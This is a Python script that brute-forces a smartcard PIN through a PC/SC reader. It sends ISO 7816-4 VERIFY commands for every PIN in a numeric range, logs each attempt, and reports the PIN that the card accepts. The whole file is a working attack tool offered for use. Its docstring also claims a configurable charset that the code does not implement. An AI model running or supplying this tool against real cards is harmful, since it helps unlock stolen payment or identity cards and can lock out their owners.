"""
pin_bruteforce.py - Smartcard PIN brute-forcing tool for GREENWIRE

Features:
- PC/SC reader detection
- PIN attempt loop (configurable range, length, charset)
- Rate limiting and lockout detection
- Logging of attempts/results
- Dry-run and real modes

Usage:
  python pin_bruteforce.py --reader 0 --min 0000 --max 9999 --rate 1 --dry-run
"""
import time
import argparse
import logging
try:
    import smartcard.System
    from smartcard.util import toHexString
except ImportError:
    smartcard = None
    print("PySCard not installed. Install with: pip install pyscard")
    exit(1)

def list_readers():
    readers = smartcard.System.readers()
    for idx, r in enumerate(readers):
        print(f"[{idx}] {r}")
    return readers

def connect(reader_idx=0):
    readers = smartcard.System.readers()
    if not readers:
        raise RuntimeError("No smartcard readers found.")
    reader = readers[reader_idx]
    connection = reader.createConnection()
    connection.connect()
    return connection

def send_pin_apdu(connection, pin_bytes):
    # Example: VERIFY PIN (ISO 7816-4: 00 20 00 80 <len> <PIN>)
    apdu = [0x00, 0x20, 0x00, 0x80, len(pin_bytes)] + list(pin_bytes)
    data, sw1, sw2 = connection.transmit(apdu)
    return data, sw1, sw2

def main():
    parser = argparse.ArgumentParser(description="Smartcard PIN brute-forcer")
    parser.add_argument('--reader', type=int, default=0, help='Reader index (default 0)')
    parser.add_argument('--min', type=str, default='0000', help='Min PIN (inclusive)')
    parser.add_argument('--max', type=str, default='9999', help='Max PIN (inclusive)')
    parser.add_argument('--rate', type=float, default=1.0, help='Delay between attempts (seconds)')
    parser.add_argument('--dry-run', action='store_true', help='Dry run (no APDU sent)')
    parser.add_argument('--log', type=str, default='pin_bruteforce.log', help='Log file')
    args = parser.parse_args()

    logging.basicConfig(filename=args.log, level=logging.INFO, format='%(asctime)s %(message)s')
    print("Listing readers:")
    readers = list_readers()
    if args.reader >= len(readers):
        print(f"Invalid reader index {args.reader}")
        return
    if not args.dry_run:
        conn = connect(args.reader)
        print(f"Connected to: {readers[args.reader]}")
    else:
        conn = None
    min_pin = int(args.min)
    max_pin = int(args.max)
    found = False
    for pin in range(min_pin, max_pin+1):
        pin_str = str(pin).zfill(len(args.min))
        pin_bytes = pin_str.encode('ascii')
        print(f"Trying PIN: {pin_str}")
        logging.info(f"Trying PIN: {pin_str}")
        if not args.dry_run:
            try:
                data, sw1, sw2 = send_pin_apdu(conn, pin_bytes)
                print(f"APDU SW: {sw1:02X} {sw2:02X}")
                logging.info(f"APDU SW: {sw1:02X} {sw2:02X}")
                if (sw1, sw2) == (0x90, 0x00):
                    print(f"SUCCESS! PIN: {pin_str}")
                    logging.info(f"SUCCESS! PIN: {pin_str}")
                    found = True
                    break
                elif (sw1, sw2) in [(0x69, 0x83), (0x63, 0xC0)]:
                    print("Card locked or blocked. Aborting.")
                    logging.warning("Card locked or blocked. Aborting.")
                    break
            except Exception as e:
                print(f"Error: {e}")
                logging.error(f"Error: {e}")
        time.sleep(args.rate)
    if not found:
        print("PIN not found in range.")
        logging.info("PIN not found in range.")

if __name__ == "__main__":
    main()
